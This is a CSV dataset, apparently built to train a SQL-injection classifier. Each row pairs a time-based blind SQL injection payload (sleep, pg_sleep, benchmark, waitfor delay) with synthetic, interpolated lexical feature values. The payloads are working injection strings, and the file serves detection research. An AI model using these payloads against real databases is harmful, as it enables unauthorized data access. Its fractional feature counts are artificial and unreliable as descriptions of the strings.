id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001590,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,0.03202763124940519,88.0,27.900570606645893,3.86255148923252,26.0,21.0,30.0,11.0,0.29545454545454547,0.23863636363636365,0.3409090909090909,0.125,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001591,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000051,0.5610218142540196,86.12265072041484,19.489842473941884,2.8790551384815406,27.163280824647295,2.0,44.63280824647295,12.32656164929459,0.3160780583970511,0.02328850006862669,0.5175358261813807,0.14309761535294152,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.32656164929459,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.1632808246472952,0.8367191753527048,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001592,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000006,0.5226436676824402,66.43749694200397,24.291664628002653,3.5699751413950764,19.583329256005307,10.0,27.145832314001325,9.708335371997347,0.29450752942430275,0.15055446433464212,0.40861056550065444,0.14632744074040077,0.8541676859986731,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.8541676859986731,1.0,0.0,3.0,0.8541676859986731,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001593,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,0.5318200317641922,82.3412251285615,23.146937178596225,3.1312264773466296,29.488162307157733,2.0,39.68245025712302,11.170612564280756,0.3582741805066912,0.02429116575825742,0.4818021401089124,0.13563251362613898,1.0,0.0,0.0,0.0,1.0,0.0,0.0,8.170612564280756,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.17061256428075522,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.170612564280755
SMOTE_001594,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,0.9619810210611126,58.895650033054906,23.729192852420727,3.5742855426260576,18.0,10.0,23.624842885475633,7.270807147579272,0.3064359373369001,0.17024218740938896,0.3999209823862125,0.1234008928674984,0.27080714757927216,0.7291928524207276,2.0,0.0,0.0,1.0,0.0,3.2708071475792724,0.0,0.0,0.0,3.0,0.2708071475792724,0.7291928524207276,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001595,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,0.6201514659918347,81.83483324286514,26.639138873810857,3.6894269058801084,23.398564789684762,17.037703663495616,32.278277747621715,9.120287042063048,0.28597464727719274,0.2067352289614104,0.3948098545789456,0.11248026918245124,0.12028704206304774,0.0,2.0,0.0,0.0,1.8797129579369523,0.0,4.0,0.12028704206304774,1.0,0.0,3.8797129579369525,0.1202870420630478,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8797129579369523,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.879712957936952
SMOTE_001596,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,0.10504093461896956,85.74129926003249,27.0570230200025,3.6958997100809126,24.342138120014994,18.0,33.342138120014994,10.057023020002498,0.28370835029537755,0.21016285874182655,0.3887897796662908,0.1173390112965051,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.057023020002499,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001597,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000062,2.349720207395624,75.23825865334015,16.619129326670073,2.540307434180066,15.31767820445353,2.0,44.0,13.920580448886618,0.20178988346401577,0.02662455176163099,0.585740138755882,0.1858454260184712,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.9205804488866174,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001598,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.0,55.0,23.0,3.794790516941512,23.0,4.0,17.0,11.0,0.41818181818181815,0.07272727272727272,0.3090909090909091,0.2,6.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001599,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,1.2350151427257092,63.724288773072736,23.936907310893947,3.821657301154028,23.0,10.0864331596091,21.21261853782121,9.425237075642421,0.36149709471168895,0.156173843571765,0.3336662687676275,0.1486627929489186,2.637855613463633,0.0,1.5747629243575783,0.0,0.0,1.0,0.0,2.2126185378212107,0.0,0.0,0.0,2.5747629243575783,1.0,0.0,0.7873814621787891,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.787381462178789,0.0,0.21261853782121082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001600,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000020,0.649244767418139,68.45652723275677,25.63768482183785,3.64481508740991,22.275369643675702,10.0,27.818842410918926,8.362315178162149,0.3250988974660118,0.14612093273439444,0.4063937997005306,0.12238637009906325,0.18115758908107438,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.18115758908107435,1.0,0.0,3.0,0.1811575890810745,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001601,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,0.5990120544855422,88.68920539051814,27.72431784379274,3.84661745754035,25.448635687585483,21.827046468621777,30.551364312414517,10.86215892189637,0.2873363392416973,0.24576084751195448,0.3443113267078364,0.12259148653851185,3.586476765689111,0.0,0.0,0.0,0.0,2.0,0.0,4.137841078103629,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.13784107810362956,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.13784107810362956,0.0,0.8621589218963704,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001602,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000027,0.7049786574348529,89.61855218918707,28.206184063062356,3.8622971877499075,27.030920315311775,20.556711558563514,31.030920315311775,11.0,0.3013763496756087,0.2298411309904784,0.34601799491782315,0.12276452441608968,3.7938159369376447,0.0,0.0,0.0,0.0,1.7938159369376447,0.0,4.4123681261247105,0.0,0.0,1.0,1.7938159369376447,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.20618406306235526,0.0,0.0,0.0,1.7938159369376447,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001603,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,1.0871121320968853,82.28864701281972,20.342270597436055,2.9792158922754934,29.31545880512789,2.0,40.973188207691834,10.0,0.356214455883989,0.024325302286672762,0.49783373039597434,0.12162651143336389,0.0,0.3422705974360556,0.0,0.0,1.0,0.0,0.0,8.657729402563945,0.0,0.0,0.0,1.0,0.0,0.3422705974360556,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.3422705974360556,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.342270597436055
SMOTE_001604,attack,time,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,1.2929794743623253,78.33700392051324,28.0,3.787752244897859,17.540155655621497,22.540155655621497,28.5133852185405,9.74330739072975,0.22274539567324247,0.2868840290667931,0.36501026994184343,0.12536030531812103,0.0,1.0,0.0,0.0,0.0,1.2566926092702495,0.0,4.7433073907297505,0.7433073907297505,0.0,1.0,1.2566926092702495,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.25669260927024945,0.0,0.7433073907297505,0.2566926092702495,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2566926092702495
SMOTE_001605,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000027,0.6376368440584291,88.75198203952031,27.751982039520314,3.867417467258038,26.0,21.751982039520314,30.0,11.0,0.29295818015481,0.2450693049856819,0.33802866940939613,0.12394384545011192,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.7519820395203123,0.24801796047968794,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001606,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000073,0.4635680223633849,72.0,25.577234828814486,3.5912648377961536,15.28184344745701,20.71815655254299,28.0,8.0,0.21224782565912514,0.28775217434087486,0.3888888888888889,0.1111111111111111,0.8590782762714952,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.8590782762714948,0.0,0.0,0.1409217237285051,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001607,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,0.03820600922213535,76.03175226081844,19.021168173878955,2.953670601660103,27.010584086939478,2.0,38.010584086939474,9.010584086939478,0.35525434369841813,0.0263052124381018,0.49993301210797797,0.11850743175550205,0.0,0.010584086939476767,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.010584086939476711,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.010584086939476767,0.9894159130605232,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001608,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,0.08523476074217153,65.04868666187085,23.04868666187085,3.4955707078449287,19.06491554916113,10.0,27.016228887290282,8.967542225419434,0.2930530461809791,0.15373600302744153,0.4153258682813022,0.13788508251027728,0.0,0.9837711127097167,1.9675422254194335,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,2.9675422254194332,0.0,0.9837711127097166,0.9837711127097167,0.016228887290283267,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001609,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.6045705056280012,91.48865868114545,22.328292747175755,2.911361840828998,29.496219560381817,2.0,47.992439120763635,12.0,0.3223871810907764,0.02189230448511381,0.5243666875134269,0.13135382691068287,0.1679268132060614,0.0,0.0,0.0,1.0,0.0,0.0,9.832073186793938,0.0,0.0,0.0,1.0,0.1679268132060615,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.16792681320606137,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.167926813206061
SMOTE_001610,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,1.1430153963442748,87.72387737728064,25.24626819675438,3.6544017923911563,20.743780327923965,24.990048524678343,32.49253639350876,9.497512131169586,0.23644657529820107,0.2836812759271966,0.3714447511602109,0.10842739761439142,0.7487560655847927,0.0,0.0,0.0,0.0,1.7487560655847927,0.0,5.0,0.0,0.0,1.0,1.7487560655847927,0.7487560655847927,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.7487560655847927,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.748756065584793
SMOTE_001611,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,1.0986220103014144,56.6285312723255,19.838041696434,3.2946764625660805,21.7904895758915,2.8855938169765007,24.3714687276745,7.580979151783,0.38512098312916554,0.049626126658098846,0.4310196631179281,0.1342332270948075,2.5809791517829996,0.0,0.0,0.0,0.0,1.0,0.0,3.7904895758915,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.20951042410850015,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7904895758914998,0.0,0.20951042410850015,0.0,0.7904895758914998,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7904895758915
SMOTE_001612,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,0.5017066233850503,70.48904815796114,24.0,3.6043797877310024,17.0,19.0,26.04980436537976,8.439243792581378,0.2426792701236437,0.2712297724911312,0.366721373884906,0.11936958350031912,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.439243792581377,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001613,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000021,1.1984526964299287,63.077685008682266,25.192974382596983,3.7910570824394596,22.884710626085283,8.96239563476755,21.461157495658867,9.769421252170567,0.3632351352873231,0.14029477414573116,0.341764144681875,0.15470594588507075,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.1152893739147167,0.0,0.0,0.0,2.7694212521705666,1.0,0.0,0.0,0.8847106260852833,0.0,1.0,1.0,0.0,0.0,0.0,0.8847106260852834,1.0,0.0,0.8847106260852833,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8847106260852833
SMOTE_001614,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000019,2.671110788709648,66.82810790296152,28.0,4.2543150891117065,30.656215805923033,7.886757218336585,15.37108092722114,12.91405395148076,0.4573679183957718,0.12011191178513708,0.22954888508983562,0.19297128472925557,4.54297302425962,0.0,2.0,0.0,0.0,0.5429730242596206,0.0,1.4570269757403795,0.0,0.45702697574037937,0.45702697574037954,4.0,1.0,0.0,1.0,0.0,0.0,0.5429730242596205,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5429730242596205,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5429730242596205
SMOTE_001615,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,0.12475206089712192,88.0,27.612708737712552,3.8445281468444774,26.0,21.0,30.0,11.0,0.29545454545454547,0.23863636363636365,0.3409090909090909,0.125,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001616,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000015,2.5202892804287944,59.82764903834142,19.0,3.1901632429988345,24.18722802190938,1.0,26.640421016432036,8.0,0.4037064882039156,0.01677220832246558,0.44534363689389417,0.13417766657972469,1.3595789835679644,1.6404210164320356,0.0,0.0,0.0,0.4531929945226548,0.0,4.546807005477345,0.0,0.0,0.0,0.4531929945226547,0.45319299452265477,0.5468070054773451,0.0,0.0,0.0,0.45319299452265477,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001617,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,0.6095069691997205,89.782045910049,28.66730688650735,3.7473184777453157,29.225636728039202,15.6653862269853,34.22371606851715,10.667306886507351,0.3226925053997717,0.17730749460022835,0.3813723235887474,0.1186276764112526,2.7782045910049007,0.0,0.0,0.0,0.0,1.0,0.0,5.88910229550245,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8891022955024501,0.0,0.0,0.0,0.8891022955024501,0.11089770449754988,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.88910229550245
SMOTE_001618,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.5394232791921219,77.82651055581884,24.028207745144503,3.523393235405152,19.056415490289,20.37094366019267,30.39915140533717,8.0,0.24375955615666167,0.2620168918497682,0.3903864865201855,0.10383706547338471,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.342735915048167,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6572640849518329,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.34273591504816714,0.0,0.0,0.0,0.34273591504816714,0.6572640849518329,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3427359150481673
SMOTE_001619,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000034,0.007672039460026676,66.98700038199546,18.998700038199548,3.2064074866750696,14.002599923600908,9.988300343795913,29.998700038199544,12.997400076399092,0.2090484916295691,0.14908251354133845,0.44784050565580147,0.19402848917329096,3.998700038199546,0.0,0.0,0.0,0.0,1.998700038199546,0.0,4.001299961800454,1.998700038199546,0.0012999618004540803,0.9987000381995459,1.998700038199546,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.001299961800454219,0.0,0.0,0.0,1.9987000381995461,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9987000381995459,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.998700038199546
SMOTE_001620,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.4029918610334147,55.84981199307373,22.362641005194703,3.721302882055536,23.0,3.7875470017315678,18.06226499134216,11.0,0.4121584974296777,0.06807884040768608,0.3226433807832251,0.1971192813794111,5.787547001731567,0.0,0.0,0.0,0.0,1.0,0.0,2.2124529982684322,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
